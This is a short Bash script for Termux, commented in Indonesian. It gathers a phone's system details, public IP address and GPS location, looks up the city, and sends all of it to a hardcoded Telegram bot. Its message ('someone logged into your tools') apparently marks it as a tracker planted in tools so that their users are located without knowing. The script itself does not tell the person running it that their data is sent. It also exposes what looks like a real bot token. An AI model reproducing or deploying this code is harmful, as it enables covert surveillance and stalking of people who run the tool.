#!/bin/bash

# Token dan Chat ID
BOT_TOKEN="7045322314:AAHGC8LTyWuBQ73v_vhP2IMJ7TuG-h4JzH4"  # Ganti dengan token bot Anda
CHAT_ID="6993419931"      # Ganti dengan chat ID Anda

# Buat variabel untuk informasi sistem
SYSTEM_INFO=$(neofetch --stdout)

# Dapatkan alamat IP publik
PUBLIC_IP=$(curl -s https://ipinfo.io | jq -r '.ip')

# Mengambil lokasi GPS
LOCATION_DATA=$(termux-location -p gps -r 60)
if [[ -z "$LOCATION_DATA" ]]; then
    echo "$(date) - Gagal mendapatkan lokasi. Pastikan GPS aktif dan Termux memiliki izin lokasi."
    exit 1
fi

# Parsing JSON untuk mendapatkan latitude, longitude, dan city
LATITUDE=$(echo "$LOCATION_DATA" | grep -o '"latitude":[^,]*' | cut -d':' -f2)
LONGITUDE=$(echo "$LOCATION_DATA" | grep -o '"longitude":[^,]*' | cut -d':' -f2)
CITY=$(curl -s "https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=$LATITUDE&longitude=$LONGITUDE&localityLanguage=en" | jq -r '.city')

# Kirim informasi sistem, IP, lokasi, dan kota ke bot Telegram
response=$(curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="
 ──▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
───█▒▒░░░░░░░░░▒▒█───
────█░░█░░░░░█░░█────
─▄▄──█░░░▀█▀░░░█──▄▄─
█░░█─▀▄░░░░░░░▄▀─█░░█
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
█░░║║║╠─║─║─║║║║║╠─░░█
█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

ADA YANG LOGIN DI TOOLS MU BANG :D

📱 : $SYSTEM_INFO 
"=========================="
🌐 : $PUBLIC_IP 
📍 : $CITY 


 ")

# Cek respons informasi sistem
if [[ $response == *'"ok":true'* ]]; then
    echo "Informasi sistem, IP, lokasi, dan kota berhasil dikirim ke Telegram."
else
    echo "Informasi sistem, IP, lokasi, dan kota gagal dikirim ke Telegram."
fi

echo "Semua yang kamu inginkan berhasil disalin dan dikirim ke Telegram."
